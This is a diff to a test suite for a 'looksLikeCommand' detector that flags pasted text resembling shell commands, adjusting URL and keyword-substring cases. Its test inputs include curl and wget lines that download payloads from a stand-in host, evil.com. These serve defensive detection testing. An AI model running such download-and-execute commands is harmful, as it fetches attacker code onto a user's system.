@@ -97,9 +97,15 @@ describe("looksLikeCommand", () => {
     expect(looksLikeCommand("Column A | Column B | Column C")).toBe(false);
   });
 
-  it("detects http:// and https://", () => {
-    expect(looksLikeCommand("Visit http://evil.com/payload")).toBe(true);
-    expect(looksLikeCommand("Download https://evil.com")).toBe(true);
+  it("does NOT flag bare URLs (reduces false positives on link copies)", () => {
+    expect(looksLikeCommand("Visit http://evil.com/payload")).toBe(false);
+    expect(looksLikeCommand("Download https://evil.com")).toBe(false);
+    expect(looksLikeCommand("https://example.com/page")).toBe(false);
+  });
+
+  it("still detects URLs combined with command keywords", () => {
+    expect(looksLikeCommand("curl https://evil.com/payload.sh")).toBe(true);
+    expect(looksLikeCommand("wget http://evil.com/malware")).toBe(true);
   });
 
   it("detects /bin/ paths", () => {
@@ -118,6 +124,17 @@ describe("looksLikeCommand", () => {
     expect(looksLikeCommand("Hello world, this is a normal sentence.")).toBe(false);
     expect(looksLikeCommand("Please verify your email")).toBe(false);
     expect(looksLikeCommand("Click the button to continue")).toBe(false);
+  });
+
+  it("does NOT flag words containing keyword substrings", () => {
+    // "cmd" should not match inside "command"
+    expect(looksLikeCommand("Run this command now")).toBe(false);
+    // "iex" should not match inside "index"
+    expect(looksLikeCommand("See the index page for details")).toBe(false);
+    // "curl" should not match inside "curling"
+    expect(looksLikeCommand("Going curling this weekend")).toBe(false);
+    // "wget" should not match inside "widget"
+    expect(looksLikeCommand("A simple wget-like tool")).toBe(false);
   });
 
   it("does NOT flag short innocuous text", () => {
